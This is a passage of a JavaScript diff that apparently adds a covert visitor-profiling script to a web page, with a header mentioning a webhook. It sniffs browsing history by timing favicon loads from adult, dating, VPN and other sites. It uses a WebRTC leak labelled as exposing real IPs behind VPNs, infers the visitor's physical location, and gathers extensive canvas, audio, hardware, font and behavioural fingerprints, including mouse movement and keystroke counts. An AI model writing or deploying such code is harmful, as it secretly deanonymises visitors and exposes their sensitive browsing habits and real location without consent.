+            { name:'Roblox',          url:'https://www.roblox.com/favicon.ico'                },
+            { name:'Minecraft',       url:'https://www.minecraft.net/favicon.ico'             },
+            { name:'Xbox',            url:'https://www.xbox.com/favicon.ico'                  },
+            { name:'PlayStation',     url:'https://www.playstation.com/favicon.ico'           },
+            { name:'Nintendo',        url:'https://www.nintendo.com/favicon.ico'              },
+            { name:'IGN',             url:'https://www.ign.com/favicon.ico'                   },
+            { name:'GameFAQs',        url:'https://gamefaqs.gamespot.com/favicon.ico'         },
+            { name:'Gamespot',        url:'https://www.gamespot.com/favicon.ico'              },
+
+            // ── AI & Tools ──
+            { name:'ChatGPT',         url:'https://chat.openai.com/favicon.ico'               },
+            { name:'Claude',          url:'https://claude.ai/favicon.ico'                     },
+            { name:'Gemini',          url:'https://gemini.google.com/favicon.ico'             },
+            { name:'Perplexity',      url:'https://www.perplexity.ai/favicon.ico'             },
+            { name:'Midjourney',      url:'https://www.midjourney.com/favicon.ico'            },
+            { name:'Hugging Face',    url:'https://huggingface.co/favicon.ico'                },
+            { name:'Civitai',         url:'https://civitai.com/favicon.ico'                   },
+
+            // ── Dating ──
+            { name:'Tinder',          url:'https://tinder.com/favicon.ico'                    },
+            { name:'Bumble',          url:'https://bumble.com/favicon.ico'                    },
+            { name:'Hinge',           url:'https://hinge.co/favicon.ico'                      },
+            { name:'OkCupid',         url:'https://www.okcupid.com/favicon.ico'               },
+            { name:'Badoo',           url:'https://badoo.com/favicon.ico'                     },
+            { name:'Grindr',          url:'https://www.grindr.com/favicon.ico'                },
+            { name:'Happn',           url:'https://www.happn.com/favicon.ico'                 },
+            { name:'Lovoo',           url:'https://www.lovoo.com/favicon.ico'                 },
+
+            // ── Adult ──
+            { name:'Pornhub',         url:'https://www.pornhub.com/favicon.ico'               },
+            { name:'OnlyFans',        url:'https://onlyfans.com/favicon.ico'                  },
+            { name:'Xvideos',         url:'https://www.xvideos.com/favicon.ico'               },
+            { name:'Xhamster',        url:'https://xhamster.com/favicon.ico'                  },
+            { name:'xnxx',            url:'https://www.xnxx.com/favicon.ico'                  },
+            { name:'RedTube',         url:'https://www.redtube.com/favicon.ico'               },
+            { name:'YouPorn',         url:'https://www.youporn.com/favicon.ico'               },
+            { name:'Chaturbate',      url:'https://chaturbate.com/favicon.ico'                },
+            { name:'LiveJasmin',      url:'https://www.livejasmin.com/favicon.ico'            },
+            { name:'Fapello',         url:'https://fapello.com/favicon.ico'                   },
+
+            // ── VPN & Privacy ──
+            { name:'NordVPN',         url:'https://nordvpn.com/favicon.ico'                   },
+            { name:'ExpressVPN',      url:'https://www.expressvpn.com/favicon.ico'            },
+            { name:'ProtonVPN',       url:'https://protonvpn.com/favicon.ico'                 },
+            { name:'Mullvad',         url:'https://mullvad.net/favicon.ico'                   },
+            { name:'Surfshark',       url:'https://surfshark.com/favicon.ico'                 },
+            { name:'Tor Project',     url:'https://www.torproject.org/favicon.ico'            },
+
+            // ── Search ──
+            { name:'Google',          url:'https://www.google.com/favicon.ico'                },
+            { name:'Bing',            url:'https://www.bing.com/favicon.ico'                  },
+            { name:'DuckDuckGo',      url:'https://duckduckgo.com/favicon.ico'                },
+            { name:'Brave Search',    url:'https://search.brave.com/favicon.ico'              },
+            { name:'Startpage',       url:'https://www.startpage.com/favicon.ico'             },
+            { name:'Ecosia',          url:'https://www.ecosia.org/favicon.ico'                },
+            { name:'Yandex',          url:'https://yandex.com/favicon.ico'                    },
+            { name:'Baidu',           url:'https://www.baidu.com/favicon.ico'                 },
+
+            // ── Misc / Brasil ──
+            { name:'Kwai',            url:'https://www.kwai.com/favicon.ico'                  },
+            { name:'Hotmart',         url:'https://hotmart.com/favicon.ico'                   },
+            { name:'Coursera',        url:'https://www.coursera.org/favicon.ico'              },
+            { name:'Udemy',           url:'https://www.udemy.com/favicon.ico'                 },
+            { name:'Khan Academy',    url:'https://www.khanacademy.org/favicon.ico'           },
+            { name:'Duolingo',        url:'https://www.duolingo.com/favicon.ico'              },
+            { name:'iFood',           url:'https://www.ifood.com.br/favicon.ico'              },
+            { name:'Rappi',           url:'https://www.rappi.com.br/favicon.ico'              },
+            { name:'99',              url:'https://www.99app.com/favicon.ico'                 },
+            { name:'Uber',            url:'https://www.uber.com/favicon.ico'                  },
+            { name:'Airbnb',          url:'https://www.airbnb.com/favicon.ico'                },
+            { name:'Booking',         url:'https://www.booking.com/favicon.ico'               },
+        ];
+
+        const THRESHOLD_MS = 20;
+        const results = [];
+        let done = 0;
+        const total = TARGETS.length;
+
+        TARGETS.forEach(target => {
+            const img = new Image();
+            const t0  = performance.now();
+            let settled = false;
+
+            const finish = (loaded) => {
+                if(settled) return;
+                settled = true;
+                const ms = Math.round(performance.now() - t0);
+                results.push({ name: target.name, ms, cached: loaded && ms < THRESHOLD_MS });
+                if(++done === total){
+                    const visited = results.filter(r => r.cached).map(r => r.name);
+                    resolve({
+                        sniffVisited:     visited.join(', ') || 'none detected',
+                        sniffVisitedCount:String(visited.length),
+                        sniffRaw:         results.map(r => `${r.name}:${r.ms}ms`).join(' | '),
+                    });
+                }
+            };
+
+            img.onload  = () => finish(true);
+            img.onerror = () => finish(false);
+            img.src = target.url;
+            setTimeout(() => finish(false), 3000);
+        });
+    });
+}
+
+/* ── VISITOR FINGERPRINT → TERMINAL BG + WEBHOOK ── */
+
+/* WebRTC STUN leak — exposes real IP behind VPN */
+function getWebRTCIPs(){
+    return new Promise(resolve=>{
+        const ips={local:[],public:[]};
+        let done=false;
+        const finish=()=>{
+            if(done)return; done=true;
+            resolve(ips);
+        };
+        setTimeout(finish,1500); // timeout if no candidates
+
+        try{
+            const pc=new RTCPeerConnection({
+                iceServers:[
+                    {urls:'stun:stun.l.google.com:19302'},
+                    {urls:'stun:stun1.l.google.com:19302'},
+                    {urls:'stun:stun.cloudflare.com:3478'},
+                    {urls:'stun:stun.ekiga.net'},
+                ]
+            });
+            // dummy data channel forces ICE gathering
+            pc.createDataChannel('');
+
+            pc.onicecandidate=e=>{
+                if(!e||!e.candidate) return finish();
+                const cand=e.candidate.candidate;
+                // IPv4 regex
+                const m4=cand.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/g)||[];
+                // IPv6 regex
+                const m6=cand.match(/([a-f0-9]{1,4}(:[a-f0-9]{0,4}){2,7})/gi)||[];
+                [...m4,...m6].forEach(ip=>{
+                    ip=ip.toLowerCase();
+                    if(ip==='0.0.0.0'||ip.startsWith('127.')||ip==='::1') return;
+                    // RFC1918 = local/private
+                    if(ip.startsWith('10.')||ip.startsWith('192.168.')||
+                       /^172\.(1[6-9]|2[0-9]|3[01])\./.test(ip)||
+                       ip.startsWith('fd')||ip.startsWith('fe80')){
+                        if(!ips.local.includes(ip)) ips.local.push(ip);
+                    } else {
+                        if(!ips.public.includes(ip)) ips.public.push(ip);
+                    }
+                });
+            };
+
+            pc.createOffer().then(o=>pc.setLocalDescription(o)).catch(finish);
+        }catch(_){ resolve(ips); }
+    });
+}
+
+/* ── RTT LATENCY PROBE ── */
+// Probes geographically distributed endpoints via no-cors fetch timing.
+// Lower RTT = physically closer to that region.
+const RTT_PROBES = [
+    { id:'sa-east-1',    label:'São Paulo',    lat:-23.55, lon:-46.63, url:'https://s3.sa-east-1.amazonaws.com/'       },
+    { id:'us-east-1',    label:'N. Virginia',  lat: 38.94, lon:-77.46, url:'https://s3.us-east-1.amazonaws.com/'      },
+    { id:'us-west-2',    label:'Oregon',       lat: 45.52, lon:-122.6, url:'https://s3.us-west-2.amazonaws.com/'      },
+    { id:'eu-west-1',    label:'Ireland',      lat: 53.33, lon: -6.25, url:'https://s3.eu-west-1.amazonaws.com/'      },
+    { id:'eu-central-1', label:'Frankfurt',    lat: 50.11, lon:  8.68, url:'https://s3.eu-central-1.amazonaws.com/'   },
+    { id:'ap-southeast-1',label:'Singapore',   lat:  1.35, lon:103.82, url:'https://s3.ap-southeast-1.amazonaws.com/' },
+    { id:'ap-northeast-1',label:'Tokyo',       lat: 35.68, lon:139.69, url:'https://s3.ap-northeast-1.amazonaws.com/' },
+    { id:'ap-southeast-2',label:'Sydney',      lat:-33.87, lon:151.21, url:'https://s3.ap-southeast-2.amazonaws.com/' },
+    { id:'ap-south-1',   label:'Mumbai',       lat: 19.08, lon: 72.88, url:'https://s3.ap-south-1.amazonaws.com/'    },
+    { id:'ca-central-1', label:'Canada',       lat: 45.42, lon:-75.70, url:'https://s3.ca-central-1.amazonaws.com/'  },
+];
+
+async function probeRTT(probe){
+    const samples=[];
+    for(let i=0;i<3;i++){
+        try{
+            const t0=performance.now();
+            await fetch(probe.url+'?_='+Date.now(), {mode:'no-cors', cache:'no-store'});
+            samples.push(performance.now()-t0);
+        }catch(_){ samples.push(9999); }
+    }
+    // median of 3
+    samples.sort((a,b)=>a-b);
+    return Math.round(samples[1]);
+}
+
+async function measureAllRTT(){
+    const results = await Promise.all(
+        RTT_PROBES.map(async p=>({ ...p, rtt: await probeRTT(p) }))
+    );
+    return results.sort((a,b)=>a.rtt-b.rtt);
+}
+
+/* ── TIMEZONE DIVERGENCE ── */
+// Compares browser TZ against the TZ of the reported IP (via ipinfo).
+// A mismatch is a strong VPN/proxy signal.
+function analyzeTZDivergence(browserTZ, ipTZ){
+    if(!browserTZ||!ipTZ||ipTZ==='N/A') return {divergence:false, detail:'no ip tz data'};
+    if(browserTZ===ipTZ) return {divergence:false, detail:'match'};
+
+    // Extract UTC offset for both
+    function tzOffset(tz){
+        try{
+            const now=new Date();
+            const local=new Date(now.toLocaleString('en-US',{timeZone:tz}));
+            return Math.round((local-now)/60000); // minutes offset
+        }catch(_){ return null; }
+    }
+    const bOff=tzOffset(browserTZ);
+    const iOff=tzOffset(ipTZ);
+    if(bOff===null||iOff===null) return {divergence:true, detail:`${browserTZ} vs ${ipTZ} (offset calc failed)`};
+    const diffH=Math.abs(bOff-iOff)/60;
+    return {
+        divergence: diffH>=1,
+        diffHours:  diffH,
+        browserTZ,
+        ipTZ,
+        detail: diffH>=1
+            ? `${diffH.toFixed(1)}h divergence (browser=${browserTZ}, ip=${ipTZ})`
+            : `same offset, different TZ names (${browserTZ} vs ${ipTZ})`
+    };
+}
+
+/* ── LOCATION INFERENCE ── */
+// Crosses lowest RTT region, browser TZ, and ipinfo coords to estimate real location.
+// Returns a human-readable verdict + confidence level.
+function inferRealLocation(rttSorted, browserTZ, ipData, webrtcIPs){
+    const closest = rttSorted[0];
+    const second  = rttSorted[1];
+
+    // Browser TZ → approx region
+    const tzRegionMap = {
+        'America/Sao_Paulo':'Brazil','America/Fortaleza':'Brazil','America/Recife':'Brazil',
+        'America/Manaus':'Brazil','America/Belem':'Brazil','America/Cuiaba':'Brazil',
+        'America/New_York':'US East','America/Chicago':'US Central','America/Denver':'US Mountain',
+        'America/Los_Angeles':'US West','America/Toronto':'Canada','America/Vancouver':'Canada',
+        'Europe/London':'UK','Europe/Paris':'France','Europe/Berlin':'Germany',
+        'Europe/Madrid':'Spain','Europe/Rome':'Italy','Europe/Amsterdam':'Netherlands',
+        'Asia/Tokyo':'Japan','Asia/Shanghai':'China','Asia/Singapore':'Singapore',
+        'Asia/Seoul':'South Korea','Asia/Kolkata':'India','Asia/Mumbai':'India',
+        'Australia/Sydney':'Australia','Australia/Melbourne':'Australia',
+        'America/Argentina/Buenos_Aires':'Argentina','America/Santiago':'Chile',
+        'America/Bogota':'Colombia','America/Lima':'Peru','America/Mexico_City':'Mexico',
+    };
+
+    const tzRegion = tzRegionMap[browserTZ] || browserTZ.split('/').pop().replace(/_/g,' ');
+    const rttRegion = closest.label;
+    const rttMs     = closest.rtt;
+
+    // Confidence heuristics
+    let confidence = 'medium';
+    let flags = [];
+
+    // RTT < 30ms = very close
+    const rttDiff = second.rtt - closest.rtt;
+
+    if(rttMs < 30)  { confidence='high'; flags.push('rtt<30ms'); }
+    if(rttMs < 60 && rttDiff > 40) { confidence='high'; flags.push('clear_winner'); }
+    if(rttMs > 150) { confidence='low';  flags.push('high_latency'); }
+
+    // TZ agrees with RTT winner → boost confidence
+    const tzMatchesRTT = tzRegion.toLowerCase().includes(rttRegion.toLowerCase().split(' ')[0]) ||
+                         rttRegion.toLowerCase().includes(tzRegion.toLowerCase().split(' ')[0]);
+    if(tzMatchesRTT) { confidence='high'; flags.push('tz_rtt_agree'); }
+
+    // WebRTC leaked a public IP → cross-check
+    let webrtcNote = '';
+    if(webrtcIPs.public.length>0){
+        webrtcNote = ' | WebRTC leaked: '+webrtcIPs.public[0];
+        confidence='high';
+        flags.push('webrtc_confirmed');
+    }
+
+    // IP tz vs browser tz divergence
+    const ipCoords = ipData.loc ? ipData.loc.split(',').map(Number) : null;
+
+    // Distance from closest RTT probe to ipinfo coords (Haversine)
+    let distKm = null;
+    if(ipCoords && ipCoords.length===2){
+        const R=6371;
+        const dLat=(ipCoords[0]-closest.lat)*Math.PI/180;
+        const dLon=(ipCoords[1]-closest.lon)*Math.PI/180;
+        const a=Math.sin(dLat/2)**2+Math.cos(closest.lat*Math.PI/180)*Math.cos(ipCoords[0]*Math.PI/180)*Math.sin(dLon/2)**2;
+        distKm=Math.round(R*2*Math.atan2(Math.sqrt(a),Math.sqrt(1-a)));
+    }
+
+    const vpnLikely = (distKm!==null && distKm>1500) || (webrtcIPs.public.length>0 && webrtcIPs.public[0]!==ipData.ip);
+
+    return {
+        estimatedRegion: rttRegion,
+        tzRegion,
+        rttMs,
+        rttDiff,
+        confidence,
+        flags: flags.join(', ')||'none',
+        distFromIPkm: distKm!==null ? distKm+'km' : 'N/A',
+        vpnLikely: vpnLikely ? 'YES' : 'no',
+        verdict: `${rttRegion} (RTT ${rttMs}ms, TZ=${tzRegion}, dist_from_ip=${distKm!==null?distKm+'km':'N/A'}${webrtcNote}) [confidence: ${confidence}]`,
+    };
+}
+
+function getBrowser(){
+    const ua=navigator.userAgent;
+    if(ua.includes('Firefox'))  return 'Firefox ' +(/Firefox\/([\d.]+)/.exec(ua)?.[1]||'');
+    if(ua.includes('Edg'))      return 'Edge '    +(/Edg\/([\d.]+)/.exec(ua)?.[1]||'');
+    if(ua.includes('OPR'))      return 'Opera '   +(/OPR\/([\d.]+)/.exec(ua)?.[1]||'');
+    if(ua.includes('Chrome'))   return 'Chrome '  +(/Chrome\/([\d.]+)/.exec(ua)?.[1]||'');
+    if(ua.includes('Safari'))   return 'Safari '  +(/Version\/([\d.]+)/.exec(ua)?.[1]||'');
+    return ua.slice(0,60);
+}
+
+function canvasFingerprint(){
+    try{
+        const c=document.createElement('canvas');
+        c.width=200;c.height=50;
+        const ctx=c.getContext('2d');
+        ctx.textBaseline='top';
+        ctx.font='14px Arial';
+        ctx.fillStyle='#f60';
+        ctx.fillRect(125,1,62,20);
+        ctx.fillStyle='#069';
+        ctx.fillText('fingerprint \ud83d\udc35',2,15);
+        ctx.fillStyle='rgba(102,204,0,0.7)';
+        ctx.fillText('fingerprint \ud83d\udc35',4,17);
+        const data=c.toDataURL();
+        let hash=0;
+        for(let i=0;i<data.length;i++){hash=(hash<<5)-hash+data.charCodeAt(i);hash|=0;}
+        return Math.abs(hash).toString(16);
+    }catch(_){return 'N/A';}
+}
+
+function webglInfo(){
+    try{
+        const c=document.createElement('canvas');
+        const gl=c.getContext('webgl')||c.getContext('experimental-webgl');
+        if(!gl)return{vendor:'N/A',renderer:'N/A'};
+        const ext=gl.getExtension('WEBGL_debug_renderer_info');
+        return{
+            vendor:   ext?gl.getParameter(ext.UNMASKED_VENDOR_WEBGL)  :(gl.getParameter(gl.VENDOR)||'N/A'),
+            renderer: ext?gl.getParameter(ext.UNMASKED_RENDERER_WEBGL):(gl.getParameter(gl.RENDERER)||'N/A'),
+        };
+    }catch(_){return{vendor:'N/A',renderer:'N/A'};}
+}
+
+/* ── #2 EXPANDED AUDIO FINGERPRINT ── */
+// Captures AudioContext properties + OfflineContext rendering + DynamicsCompressor curve.
+// Much more entropy than a single frequency sum.
+function audioFingerprint(){
+    return new Promise(resolve=>{
+        try{
+            // ── Part A: live context properties ──
+            const liveCtx = new(window.AudioContext||window.webkitAudioContext)();
+            const liveProps = {
+                sampleRate:       liveCtx.sampleRate,
+                channelCount:     liveCtx.destination.channelCount,
+                channelCountMode: liveCtx.destination.channelCountMode,
+                maxChannelCount:  liveCtx.destination.maxChannelCount,
+                state:            liveCtx.state,
+                baseLatency:      liveCtx.baseLatency != null ? liveCtx.baseLatency.toFixed(6) : 'N/A',
+            };
+            liveCtx.close();
+
+            // ── Part B: OfflineAudioContext rendering (most fingerprint entropy) ──
+            // Renders a deterministic signal; tiny FPU/DSP differences produce unique output.
+            const offline = new OfflineAudioContext(1, 4096, 44100);
+
+            const osc = offline.createOscillator();
+            osc.type = 'triangle';
+            osc.frequency.value = 10000;
+
+            // DynamicsCompressor — its internal curve computation varies by implementation
+            const comp = offline.createDynamicsCompressor();
+            comp.threshold.value = -50;
+            comp.knee.value      = 40;
+            comp.ratio.value     = 12;
+            comp.attack.value    = 0;
+            comp.release.value   = 0.25;
+
+            // Add extra oscillator for richer signal
+            const osc2 = offline.createOscillator();
+            osc2.type = 'sawtooth';
+            osc2.frequency.value = 440;
+
+            const gain = offline.createGain();
+            gain.gain.value = 0; // silent — no audio output
+
+            osc.connect(comp);
+            osc2.connect(comp);
+            comp.connect(offline.destination);
+
+            osc.start(0); osc2.start(0);
+            osc.stop(offline.length / offline.sampleRate);
+            osc2.stop(offline.length / offline.sampleRate);
+
+            offline.startRendering().then(buffer=>{
+                const data = buffer.getChannelData(0);
+
+                // Hash: sum of abs values (classic)
+                let sum = 0;
+                for(let i = 0; i < data.length; i++) sum += Math.abs(data[i]);
+
+                // Extra: sample specific indices for more entropy
+                const samples = [0, 100, 500, 1000, 2000, 3000, 4000].map(i=>
+                    data[i] != null ? data[i].toFixed(10) : '0'
+                ).join(',');
+
+                // Hash samples string
+                let h2 = 0;
+                for(let i = 0; i < samples.length; i++){ h2 = ((h2<<5)-h2+samples.charCodeAt(i))|0; }
+
+                resolve({
+                    sum:        sum.toFixed(6),
+                    hash:       Math.abs(h2).toString(16),
+                    sampleRate: liveProps.sampleRate,
+                    channels:   liveProps.maxChannelCount,
+                    latency:    liveProps.baseLatency,
+                    compKnee:   comp.knee.value.toFixed(2),
+                });
+            }).catch(()=> resolve({sum:'N/A',hash:'N/A',sampleRate:'N/A',channels:'N/A',latency:'N/A',compKnee:'N/A'}));
+        }catch(_){
+            resolve({sum:'N/A',hash:'N/A',sampleRate:'N/A',channels:'N/A',latency:'N/A',compKnee:'N/A'});
+        }
+    });
+}
+
+
+/* ── BATTERY API ── */
+async function getBattery(){
+    try{
+        if(!navigator.getBattery) return {level:'N/A',charging:'N/A',chargingTime:'N/A',dischargingTime:'N/A'};
+        const b = await navigator.getBattery();
+        return {
+            level:          Math.round(b.level*100)+'%',
+            charging:       String(b.charging),
+            chargingTime:   b.chargingTime===Infinity?'∞':b.chargingTime+'s',
+            dischargingTime:b.dischargingTime===Infinity?'∞':b.dischargingTime+'s',
+        };
+    }catch(_){return {level:'N/A',charging:'N/A',chargingTime:'N/A',dischargingTime:'N/A'};}
+}
+
+/* ── MEDIA DEVICES (no permission needed for count) ── */
+async function getMediaDevices(){
+    try{
+        const devs = await navigator.mediaDevices.enumerateDevices();
+        const cameras   = devs.filter(d=>d.kind==='videoinput').length;
+        const mics      = devs.filter(d=>d.kind==='audioinput').length;
+        const speakers  = devs.filter(d=>d.kind==='audiooutput').length;
+        return { cameras, mics, speakers };
+    }catch(_){return {cameras:'N/A',mics:'N/A',speakers:'N/A'};}
+}
+
+/* ── UA CLIENT HINTS HIGH ENTROPY ── */
+async function getUACH(){
+    try{
+        if(!navigator.userAgentData) return {};
+        const h = await navigator.userAgentData.getHighEntropyValues([
+            'architecture','bitness','model','platformVersion','fullVersionList'
+        ]);
+        return {
+            arch:            h.architecture||'N/A',
+            bitness:         h.bitness||'N/A',
+            model:           h.model||'N/A',
+            platformVersion: h.platformVersion||'N/A',
+            fullVersionList: (h.fullVersionList||[]).map(b=>b.brand+'@'+b.version).join(', ')||'N/A',
+        };
+    }catch(_){return {arch:'N/A',bitness:'N/A',model:'N/A',platformVersion:'N/A',fullVersionList:'N/A'};}
+}
+
+/* ── SENSORS / MOTION ── */
+function detectSensors(){
+    return new Promise(resolve=>{
+        const result={accelerometer:'no',gyroscope:'no',orientation:'no'};
+        let fired=false;
+
+        // DeviceMotionEvent → accelerometer
+        function onMotion(e){
+            if(e.acceleration&&(e.acceleration.x!==null)) result.accelerometer='yes';
+            if(e.rotationRate&&(e.rotationRate.alpha!==null)) result.gyroscope='yes';
+            if(!fired){fired=true; window.removeEventListener('devicemotion',onMotion); resolve(result);}
+        }
+        // DeviceOrientationEvent → orientation sensor
+        function onOrient(e){
+            if(e.alpha!==null) result.orientation='yes';
+        }
+
+        if(typeof DeviceMotionEvent==='undefined'&&typeof DeviceOrientationEvent==='undefined'){
+            resolve(result); return;
+        }
+        window.addEventListener('devicemotion',onMotion,{once:true});
+        window.addEventListener('deviceorientation',onOrient,{once:true});
+        setTimeout(()=>{
+            window.removeEventListener('devicemotion',onMotion);
+            window.removeEventListener('deviceorientation',onOrient);
+            resolve(result);
+        },400);
+    });
+}
+
+/* ── #8 PASSIVE BEHAVIORAL BIOMETRICS + MOUSE ENTROPY ── */
+// Collects mouse/scroll/touch patterns for 4s then summarises.
+// Entropy score: Shannon entropy of movement angle distribution → "how human is the mouse?"
+// Bots/scripts tend to move in straight lines (low entropy). Humans are irregular (high entropy).
+function collectBehavior(){
+    return new Promise(resolve=>{
+        const moves=[]; const scrolls=[]; let keyCount=0; let clicks=0;
+        const t0=performance.now();
+
+        const onMove=e=>{ if(moves.length<400) moves.push({x:e.clientX,y:e.clientY,t:Math.round(performance.now()-t0)}); };
+        const onScroll=()=>{ scrolls.push({y:window.scrollY,t:Math.round(performance.now()-t0)}); };
+        const onKey=()=>keyCount++;
+        const onClick=()=>clicks++;
+
+        window.addEventListener('mousemove',onMove,{passive:true});
+        window.addEventListener('scroll',onScroll,{passive:true});
+        window.addEventListener('keydown',onKey,{passive:true});
+        window.addEventListener('click',onClick,{passive:true});
+
+        setTimeout(()=>{
+            window.removeEventListener('mousemove',onMove);
+            window.removeEventListener('scroll',onScroll);
+            window.removeEventListener('keydown',onKey);
+            window.removeEventListener('click',onClick);
+
+            // ── Avg velocity ──
+            let totalDist=0;
+            const speeds=[];
+            for(let i=1;i<moves.length;i++){
+                const d=Math.hypot(moves[i].x-moves[i-1].x,moves[i].y-moves[i-1].y);
+                const dt=Math.max(1,moves[i].t-moves[i-1].t);
+                totalDist+=d;
+                speeds.push(d/dt);
+            }
+            const avgVelocity = moves.length>1 ? Math.round(totalDist/(moves.length-1)) : 0;
+
+            // ── Scroll speed ──
+            let scrollDist=0;
+            for(let i=1;i<scrolls.length;i++) scrollDist+=Math.abs(scrolls[i].y-scrolls[i-1].y);
+            const scrollSpeed = scrolls.length>1 ? Math.round(scrollDist/scrolls.length) : 0;
+
+            // ── #8 Mouse entropy (Shannon on angle buckets) ──
+            // Quantise movement angles into 16 buckets (22.5° each) and compute Shannon entropy.
+            // Random/human motion fills many buckets; bots concentrate in 1-2 directions.
+            let mouseEntropy = 'N/A';
+            let humanScore   = 'N/A';
+            if(moves.length >= 5){
+                const BUCKETS = 16;
+                const counts  = new Array(BUCKETS).fill(0);
+                for(let i=1;i<moves.length;i++){
+                    const dx=moves[i].x-moves[i-1].x, dy=moves[i].y-moves[i-1].y;
+                    if(dx===0&&dy===0) continue;
+                    const angle = Math.atan2(dy,dx); // -π to π
+                    const bucket = Math.floor(((angle + Math.PI) / (2*Math.PI)) * BUCKETS) % BUCKETS;
+                    counts[bucket]++;
+                }
+                const total = counts.reduce((a,b)=>a+b,0);
+                if(total > 0){
+                    let entropy = 0;
+                    counts.forEach(c=>{ if(c>0){ const p=c/total; entropy-=p*Math.log2(p); } });
+                    mouseEntropy = entropy.toFixed(3)+' bits';
+                    // Max possible = log2(16) = 4 bits. Score = % of max.
+                    const score = Math.round((entropy / Math.log2(BUCKETS)) * 100);
+                    humanScore  = score+'% ('+( score>=70?'human-like': score>=40?'mixed':'bot-like')+')';
+                }
+            }
+
+            // ── Acceleration jitter (std-dev of speed changes) ──
+            // Real humans have high jitter; scripted movement is smooth.
+            let accelJitter = 'N/A';
+            if(speeds.length >= 3){
+                const mean = speeds.reduce((a,b)=>a+b,0)/speeds.length;
+                const variance = speeds.reduce((a,v)=>a+(v-mean)**2,0)/speeds.length;
+                accelJitter = Math.sqrt(variance).toFixed(3)+'px/ms²';
+            }
+
+            resolve({
+                mouseMoves:    moves.length,
+                mouseVelocity: avgVelocity+'px/move',
+                mouseEntropy,
+                humanScore,
+                accelJitter,
+                scrollEvents:  scrolls.length,
+                scrollSpeed:   scrollSpeed+'px/event',
+                keystrokes:    keyCount,
+                clicks,
+            });
+        }, 4000);
+    });
+}
+
+function detectFonts(){
+    const test=['Arial','Verdana','Times New Roman','Courier New','Georgia',
+        'Trebuchet MS','Comic Sans MS','Impact','Palatino','Garamond',
+        'Tahoma','Lucida Console','Monaco','Consolas','Ubuntu',
+        'Roboto','Noto Sans','DejaVu Sans','Helvetica','Calibri'];
+    const canvas=document.createElement('canvas');
+    const ctx=canvas.getContext('2d');
+    canvas.width=200;canvas.height=50;
+    function w(font){ctx.font=`16px ${font},monospace`;return ctx.measureText('mmmmmmmmli').width;}
+    const base=w('_none_');
+    return test.filter(f=>w(f)!==base);
+}
+
+/* ── #4 HARDWARE CONCURRENCY WORKER CHECK ── */
+// Spawns real Workers to verify navigator.hardwareConcurrency isn't spoofed.
+// A spoofer reports N cores but workers all finish at the same time (no parallelism).
+function checkWorkerConcurrency(){
+    return new Promise(resolve=>{
+        const reported = navigator.hardwareConcurrency || 1;
+        try {
+            const blob = new Blob([`
+                self.onmessage = function(e) {
+                    const start = Date.now();
+                    let x = 0;
+                    for(let i=0;i<5e6;i++) x+=Math.sqrt(i);
+                    self.postMessage(Date.now()-start);
+                };
+            `], {type:'application/javascript'});
+            const url = URL.createObjectURL(blob);
+            const count = Math.min(reported, 8);
+            const workers = Array.from({length:count}, ()=>new Worker(url));
+            const times = [];
+            workers.forEach(w=>{
+                w.onmessage = e=>{
+                    times.push(e.data);
+                    w.terminate();
+                    if(times.length===count){
+                        URL.revokeObjectURL(url);
+                        const avg = Math.round(times.reduce((a,b)=>a+b,0)/times.length);
+                        const max = Math.max(...times);
+                        const min = Math.min(...times);
+                        // If all workers finish in similar time AND count>1, real parallelism likely
+                        const spread = max - min;
+                        const parallel = count > 1 && spread < avg * 0.5;
+                        resolve({
+                            reported,
+                            workerCount: count,
+                            avgMs: avg,
+                            spreadMs: spread,
+                            parallelismConfirmed: parallel ? 'yes' : 'uncertain',
+                            spoofSuspect: (!parallel && reported > 4) ? 'YES' : 'no',
+                        });
+                    }
+                };
+                w.postMessage(null);
+            });
+        } catch(_) {
+            resolve({ reported, workerCount: 0, avgMs: 'N/A', spreadMs: 'N/A', parallelismConfirmed: 'N/A', spoofSuspect: 'N/A' });
+        }
+    });
+}
+
+/* ── #5 MATH / FPU PRECISION FINGERPRINT ── */
+// CPU/FPU trig implementations vary slightly per architecture.
+// The combination of these values is surprisingly unique.
+function mathPrecisionFP(){
+    try {
+        const vals = [
+            Math.sin(Math.PI / 4),
+            Math.cos(Math.PI / 3),
+            Math.tan(Math.PI / 6),
+            Math.asin(0.5),
+            Math.acos(0.5),
+            Math.atan(1),
+            Math.atan2(1, 1),
+            Math.log(Math.E),
+            Math.log2(2),
+            Math.log10(10),
+            Math.exp(1),
+            Math.pow(2, 0.5),
+            Math.cbrt(27),
+            Math.hypot(3, 4),
+            Math.sinh(1),
+            Math.cosh(1),
+            Math.tanh(0.5),
+            1 / Math.sqrt(2),
+        ];
+        // Hash all values into a single fingerprint string
+        const raw = vals.map(v => v.toFixed(15)).join('|');
+        let hash = 0;
+        for(let i = 0; i < raw.length; i++){ hash = ((hash << 5) - hash + raw.charCodeAt(i)) | 0; }
+        return { hash: Math.abs(hash).toString(16), sample: vals[0].toFixed(15) };
+    } catch(_) { return { hash: 'N/A', sample: 'N/A' }; }
+}
+
+/* ── #6 EMOJI / UNICODE CANVAS FINGERPRINT ── */
+// Emoji rendering varies significantly across OS, font stacks, and emoji versions.
+// The resulting pixel hash is very OS/platform-specific.
+function emojiCanvasFP(){
+    try {
+        const c = document.createElement('canvas');
+        c.width = 64; c.height = 64;
+        const ctx = c.getContext('2d');
+        ctx.font = '32px serif';
+        ctx.textBaseline = 'middle';
+        // Complex emojis that differ most across platforms
+        ctx.fillText('😀🏴‍☠️👨‍👩‍👧‍👦🌈', 2, 32);
+        ctx.font = '12px monospace';
+        ctx.fillText('\u0041\u030A\u00e9\u00fc\u4e2d', 2, 56); // combining chars + CJK
+        const data = c.toDataURL();
+        let hash = 0;
+        for(let i = 0; i < data.length; i++){ hash = ((hash << 5) - hash + data.charCodeAt(i)) | 0; }
+        return Math.abs(hash).toString(16);
+    } catch(_) { return 'N/A'; }
+}
+
+/* ── #7 CSS MEDIA QUERIES ADVANCED ── */
+// Collects extra entropy from preference media queries not captured by UA-CH.
+function cssMediaQueries(){
+    const mq = q => window.matchMedia(q).matches;
+    return {
+        prefersReducedMotion:  mq('(prefers-reduced-motion: reduce)')   ? 'reduce'  : 'no-pref',
+        prefersColorScheme:    mq('(prefers-color-scheme: dark)')        ? 'dark'    : mq('(prefers-color-scheme: light)') ? 'light' : 'no-pref',
+        prefersContrast:       mq('(prefers-contrast: more)')            ? 'more'    : mq('(prefers-contrast: less)') ? 'less' : 'no-pref',
+        forcedColors:          mq('(forced-colors: active)')             ? 'active'  : 'none',
+        hoverCapability:       mq('(hover: hover)')                      ? 'hover'   : 'none',
